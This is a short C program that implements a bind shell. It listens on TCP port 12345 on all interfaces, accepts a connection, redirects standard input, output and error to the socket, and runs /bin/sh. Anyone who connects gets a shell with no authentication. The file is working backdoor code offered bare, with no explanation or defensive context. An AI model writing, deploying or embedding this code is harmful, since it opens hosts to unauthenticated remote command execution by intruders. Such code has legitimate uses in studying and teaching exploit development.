//#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main (void) {
    int new, i, sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = 0;
    sin.sin_port = htons(12345);
    
    bind(sockfd, (struct sockaddr *)&sin, sizeof(sin));
    listen(sockfd, 5);
    new = accept(sockfd, NULL, 0);
    for (i = 2; i >= 0; i--)
        dup2(new, i);
    char * shell[2];
    shell[0] = "/bin/sh";
    shell[1] = 0;
    execve(shell[0], shell, NULL);
}
